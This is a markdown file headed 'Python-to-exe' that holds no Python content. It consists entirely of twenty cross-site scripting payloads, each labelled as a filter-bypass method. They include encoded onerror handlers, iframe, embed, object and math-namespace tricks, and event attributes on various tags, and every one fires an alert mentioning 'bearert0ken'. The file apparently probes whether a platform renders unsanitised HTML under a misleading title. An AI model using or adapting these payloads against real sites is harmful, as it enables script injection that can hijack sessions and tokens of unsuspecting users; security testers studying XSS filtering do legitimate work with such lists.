# Python-to-exe

<!-- Method 1: Unicode/Encoding bypass -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#104;&#105;&#32;&#98;&#101;&#97;&#114;&#101;&#114;&#116;&#48;&#107;&#101;&#110;&#39;&#41;">

<!-- Method 2: Case variation -->
<IMG SRC=x OnErRoR="alert('hi bearert0ken')">

<!-- Method 3: HTML entity encoding -->
<img src=x onerror="alert&lpar;'hi bearert0ken'&rpar;">

<!-- Method 4: Double encoding -->
<img src=x onerror="%61%6c%65%72%74%28%27%68%69%20%62%65%61%72%65%72%74%30%6b%65%6e%27%29">

<!-- Method 5: Protocol-less iframe -->
<iframe src="//github.com" onload="alert('hi bearert0ken')"></iframe>

<!-- Method 6: Embed with script -->
<embed src="data:text/html,<script>alert('hi bearert0ken')</script>">

<!-- Method 7: Object tag -->
<object data="data:text/html,<script>alert('hi bearert0ken')</script>"></object>

<!-- Method 8: Math/SVG namespace -->
<math><mi//xlink:href="data:x,<script>alert('hi bearert0ken')</script>"></mi></math>

<!-- Method 9: Table with event -->
<table><tr><td onmouseover="alert('hi bearert0ken')">Hover me</td></tr></table>

<!-- Method 10: Form with event -->
<form onsubmit="alert('hi bearert0ken')"><input type="submit"></form>

<!-- Method 11: Marquee tag -->
<marquee onstart="alert('hi bearert0ken')"></marquee>

<!-- Method 12: Video/Audio tag -->
<video onloadstart="alert('hi bearert0ken')" src=x></video>

<!-- Method 13: Track tag -->
<track onload="alert('hi bearert0ken')">

<!-- Method 14: Style with expression (old IE) -->
<div style="background:url('javascript:alert(&#34;hi bearert0ken&#34;)')"></div>

<!-- Method 15: Link tag abuse -->
<link rel="stylesheet" href="javascript:alert('hi bearert0ken')">

<!-- Method 16: Meta with content-security-policy bypass -->
<meta http-equiv="X-UA-Compatible" content="IE=edge"><script>alert('hi bearert0ken')</script>

<!-- Method 17: Keygen tag -->
<keygen onfocus="alert('hi bearert0ken')" autofocus>

<!-- Method 18: Picture tag -->
<picture><img src=x onerror="alert('hi bearert0ken')"></picture>

<!-- Method 19: Noscript bypass -->
<noscript><img src=x onerror="alert('hi bearert0ken')"></noscript>

<!-- Method 20: Unknown tag with event -->
<unknown onload="alert('hi bearert0ken')"></unknown>